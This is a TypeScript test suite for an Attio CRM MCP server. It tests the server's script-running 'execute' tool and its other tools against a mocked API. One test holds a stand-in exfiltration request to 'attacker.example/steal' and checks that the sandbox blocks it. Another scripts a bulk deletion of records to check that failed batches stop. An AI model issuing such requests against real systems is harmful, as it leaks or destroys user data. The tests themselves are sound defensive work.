import assert from 'node:assert/strict';
import { test } from 'node:test';
import { CanceledError } from 'axios';
import { Client, StreamableHTTPClientTransport } from '@modelcontextprotocol/client';
import { createMcpHandler, InMemoryTransport } from '@modelcontextprotocol/server';

import { createAttioServer } from '../src/server/mcp-server.js';
import { formatToolContent } from '../src/server/tools.js';
import { loadSpec } from '../src/spec/loader.js';
import { MAX_OUTPUT_CHARS } from '../src/utils/truncate.js';
import { offlineClient, type Responder } from './helpers.js';

type TextBlock = { type: string; text: string };
const textOf = (result: { content?: unknown }): string => (result.content as TextBlock[])[0].text;
const spec = loadSpec();

/**
 * The real server with a scripted Attio behind it, connected in-process.
 * 'legacy' is the 2025 handshake; 'modern' is protocol revision 2026-07-28.
 */
async function connect(era: 'legacy' | 'modern', replies: Responder[] = []) {
  const { client: attio, seen } = offlineClient(replies);
  const build = () => createAttioServer({ client: attio, spec });
  const client = new Client(
    { name: 'attio-offline-test', version: '1.0.0' },
    { versionNegotiation: { mode: era === 'modern' ? 'auto' : 'legacy' } }
  );
  let close: () => Promise<void>;
  if (era === 'modern') {
    const handler = createMcpHandler(build);
    await client.connect(new StreamableHTTPClientTransport(new URL('http://test.local/mcp'), {
      fetch: (url, init) => handler.fetch(new Request(url, init))
    }));
    close = async () => { await client.close(); await handler.close(); };
  } else {
    const [clientSide, serverSide] = InMemoryTransport.createLinkedPair();
    const server = build();
    await server.connect(serverSide);
    await client.connect(clientSide);
    close = async () => { await client.close(); await server.close(); };
  }
  assert.equal(client.getProtocolEra(), era);
  return { client, seen, close };
}

for (const era of ['legacy', 'modern'] as const) {
  test(`execute (${era}): chains authenticated calls and reports progress`, async () => {
    const { client, seen, close } = await connect(era, [
      { status: 200, data: { data: [{ id: { record_id: 'rec_1' }, values: { name: [{ value: 'Acme' }] } }] } },
      { status: 200, data: { data: [{ title: 'Kickoff' }] } }
    ]);
    try {
      const progress: { progress: number; message?: string }[] = [];
      const result = await client.callTool({
        name: 'execute',
        arguments: {
          code: `
            const companies = await api.request({ method: 'POST', path: '/v2/objects/companies/records/query', params: { limit: 1 } });
            const id = companies.data[0].id.record_id;
            const notes = await api.request({ method: 'GET', path: '/v2/notes', params: { parent_object: 'companies', parent_record_id: id } });
            console.log('found', id);
            return { id, notes: notes.data.length };
          `
        }
      }, { onprogress: update => progress.push(update) });

      assert.equal(result.isError, undefined);
      assert.deepEqual(JSON.parse(textOf(result)), { result: { id: 'rec_1', notes: 1 }, logs: ['found rec_1'] });
      assert.deepEqual(seen.map(config => [config.method, config.url]), [
        ['post', '/v2/objects/companies/records/query'],
        ['get', '/v2/notes']
      ]);
      assert.ok(seen.every(config => config.headers.Authorization === 'Bearer offline-fixture-key'));
      assert.deepEqual(seen[1].params, { parent_object: 'companies', parent_record_id: 'rec_1' });
      assert.deepEqual(progress.map(update => [update.progress, update.message]), [
        [1, 'POST /v2/objects/companies/records/query'],
        [2, 'GET /v2/notes']
      ]);
    } finally {
      await close();
    }
  });

  test(`execute (${era}): API errors are catchable in the script and tool errors when uncaught`, async () => {
    const notFound = { status: 404, data: { status_code: 404, type: 'invalid_request_error', code: 'not_found', message: 'Record not found' } };
    const { client, close } = await connect(era, [notFound, notFound]);
    try {
      const caught = await client.callTool({
        name: 'execute',
        arguments: { code: `try { await api.request({ method: 'GET', path: '/v2/objects/people/records/x' }); } catch (e) { return { status: e.status, code: e.code, name: e.name }; }` }
      });
      assert.equal(caught.isError, undefined);
      assert.deepEqual(JSON.parse(textOf(caught)).result, { status: 404, code: 'not_found', name: 'AttioApiError' });

      const uncaught = await client.callTool({
        name: 'execute',
        arguments: { code: `await api.request({ method: 'GET', path: '/v2/objects/people/records/x' });` }
      });
      assert.equal(uncaught.isError, true);
      assert.match(JSON.parse(textOf(uncaught)).error, /^Attio API 404 not_found on GET \/v2\/objects\/people\/records\/x: Record not found$/);
    } finally {
      await close();
    }
  });

  test(`execute (${era}): a path naming another host never produces a request`, async () => {
    const { client, seen, close } = await connect(era);
    try {
      const result = await client.callTool({
        name: 'execute',
        arguments: { code: `return await api.request({ method: 'GET', path: 'https://attacker.example/steal' });` }
      });
      assert.equal(result.isError, true);
      assert.match(textOf(result), /path must be an Attio API path/);
      assert.equal(seen.length, 0);
    } finally {
      await close();
    }
  });

  test(`execute (${era}): api.paginate walks every page inside one script`, async () => {
    const { client, seen, close } = await connect(era, [
      { status: 200, data: { data: [{ n: 1 }, { n: 2 }], pagination: { next_cursor: 'c1' } } },
      { status: 200, data: { data: [{ n: 3 }], pagination: { next_cursor: null } } }
    ]);
    try {
      const result = await client.callTool({
        name: 'execute',
        arguments: { code: `const all = await api.paginate({ method: 'GET', path: '/v2/meetings', params: { limit: 2 } }); return { n: all.data.map(m => m.n), pages: all.pages, hasMore: all.hasMore };` }
      });
      assert.deepEqual(JSON.parse(textOf(result)).result, { n: [1, 2, 3], pages: 2, hasMore: false });
      assert.deepEqual(seen.map(config => config.params), [{ limit: 2 }, { limit: 2, cursor: 'c1' }]);
    } finally {
      await close();
    }
  });

  test(`execute (${era}): cancelling the call aborts the request in flight`, async () => {
    let started = false;
    let aborted = false;
    const hang: Responder = config => new Promise((_, reject) => {
      started = true;
      (config.signal as AbortSignal).addEventListener('abort', () => {
        aborted = true;
        reject(new CanceledError('canceled'));
      });
    });
    const { client, close } = await connect(era, [hang]);
    try {
      const controller = new AbortController();
      const call = client.callTool(
        { name: 'execute', arguments: { code: `return await api.request({ method: 'POST', path: '/v2/notes', body: {} });` } },
        { signal: controller.signal }
      );
      const settled = call.then(() => 'resolved', () => 'rejected');
      while (!started) await new Promise(resolve => setTimeout(resolve, 10));
      controller.abort();
      assert.equal(await settled, 'rejected');
      const deadline = Date.now() + 3_000;
      while (!aborted && Date.now() < deadline) await new Promise(resolve => setTimeout(resolve, 10));
      assert.equal(aborted, true, 'the Attio request was left running after the client cancelled');
    } finally {
      await close();
    }
  });

  test(`execute (${era}): calls the script did not await stop when it returns`, async () => {
    const { client, seen, close } = await connect(era);
    try {
      const progress: number[] = [];
      const result = await client.callTool({
        name: 'execute',
        arguments: { code: `for (let i = 0; i < 75; i++) api.request({ method: 'POST', path: '/v2/notes', body: { i } }); return 'done';` }
      }, { onprogress: update => progress.push(update.progress) });
      assert.equal(JSON.parse(textOf(result)).result, 'done');
      const sentAtReturn = seen.length;
      const progressAtReturn = progress.length;
      // 25 writes per second are allowed: the other 50 were waiting and must never go out.
      assert.ok(sentAtReturn <= 25, `${sentAtReturn} writes were sent`);
      await new Promise(resolve => setTimeout(resolve, 1_300));
      assert.equal(seen.length, sentAtReturn, 'writes kept going after the model was given the result');
      assert.equal(progress.length, progressAtReturn, 'progress was reported for a finished request');
    } finally {
      await close();
    }
  });

  test(`execute (${era}): a batch that fails does not keep running behind the error`, async () => {
    const gone = { status: 404, data: { code: 'not_found', message: 'Record not found' } };
    const { client, seen, close } = await connect(era, [{ status: 200 }, gone]);
    try {
      const result = await client.callTool({
        name: 'execute',
        arguments: {
          code: `
            const ids = Array.from({ length: 60 }, (_, i) => 'rec_' + i);
            await Promise.all(ids.map(id => api.request({ method: 'DELETE', path: '/v2/objects/people/records/' + id })));
            return 'all deleted';
          `
        }
      });
      assert.equal(result.isError, true);
      assert.match(JSON.parse(textOf(result)).error, /404 not_found on DELETE \/v2\/objects\/people\/records\/rec_1/);
      const sentAtError = seen.length;
      assert.ok(sentAtError <= 25, `${sentAtError} deletes were sent`);
      await new Promise(resolve => setTimeout(resolve, 1_300));
      assert.equal(seen.length, sentAtError, 'deletes kept going after the model was told the batch failed');
    } finally {
      await close();
    }
  });

  test(`execute (${era}): a script that throws without a message is still an error`, async () => {
    const { client, close } = await connect(era);
    try {
      for (const [code, expected] of [
        ['throw new Error()', 'Error (no message)'],
        ['throw ""', 'Script threw an empty value'],
        ['throw new RangeError("")', 'RangeError (no message)']
      ]) {
        const result = await client.callTool({ name: 'execute', arguments: { code } });
        assert.equal(result.isError, true, code);
        assert.deepEqual(JSON.parse(textOf(result)), { error: expected, logs: [] }, code);
      }
    } finally {
      await close();
    }
  });

  test(`context (${era}): the keywords work in any letter case`, async () => {
    const { client, close } = await connect(era);
    try {
      const all = (await client.callTool({ name: 'context', arguments: { topic: ' ALL ' } })).structuredContent as { count: number; baseUrl: string };
      assert.ok(all.count > 300 && all.baseUrl);
      const blank = (await client.callTool({ name: 'context', arguments: { topic: '  ' } })).structuredContent as { count: number };
      assert.equal(blank.count, all.count);
      const groups = (await client.callTool({ name: 'context', arguments: { topic: 'Categories' } })).structuredContent as { categories: string[] };
      assert.ok(groups.categories.length > 10);
    } finally {
      await close();
    }
  });

  test(`test_connection (${era}): reports the workspace and scopes, or why it failed`, async () => {
    const { client, close } = await connect(era, [
      {
        status: 200,
        data: {
          active: true, scope: 'record_permission:read object_configuration:read note:read-write',
          workspace_id: 'ws_1', workspace_name: 'Acme', workspace_slug: 'acme'
        }
      },
      { status: 401, data: { status_code: 401, type: 'auth_error', code: 'unauthorized', message: 'Invalid access token' } },
      { status: 200, data: { active: false } }
    ]);
    try {
      const ok = await client.callTool({ name: 'test_connection', arguments: {} });
      const info = ok.structuredContent as Record<string, unknown>;
      assert.equal(info.connected, true);
      assert.deepEqual(info.workspace, { id: 'ws_1', name: 'Acme', slug: 'acme' });
      assert.deepEqual(info.scopes, ['record_permission:read', 'object_configuration:read', 'note:read-write']);
      assert.deepEqual(info.spec, {
        apiVersion: spec.info.version, endpoints: spec.pathCount, operations: spec.operationCount, schemas: spec.schemaCount
      });
      assert.deepEqual(JSON.parse(textOf(ok)), info);

      const denied = (await client.callTool({ name: 'test_connection', arguments: {} })).structuredContent as Record<string, unknown>;
      assert.equal(denied.connected, false);
      assert.match(String(denied.message), /^Connection failed: Attio API 401 unauthorized on GET \/v2\/self: Invalid access token Check your ATTIO_API_KEY\.$/);
      assert.equal(denied.workspace, undefined);

      const inactive = (await client.callTool({ name: 'test_connection', arguments: {} })).structuredContent as Record<string, unknown>;
      assert.equal(inactive.connected, false);
      assert.match(String(inactive.message), /not active/);
    } finally {
      await close();
    }
  });
}

test('tool output stays parseable until it truly exceeds the cap', () => {
  const rows = Array.from({ length: 900 }, (_, i) => ({ id: `record_${i}`, name: `Company ${i}` }));
  const pretty = JSON.stringify(rows, null, 2);
  assert.ok(pretty.length > MAX_OUTPUT_CHARS && JSON.stringify(rows).length < MAX_OUTPUT_CHARS);
  assert.deepEqual(JSON.parse(formatToolContent(rows)), rows);

  assert.equal(formatToolContent({ a: 1 }), '{\n  "a": 1\n}');
  const huge = formatToolContent(Array.from({ length: 20_000 }, (_, i) => ({ id: i })));
  assert.match(huge, /\[TRUNCATED — \d+ chars total, showing first 40000\]$/);
});
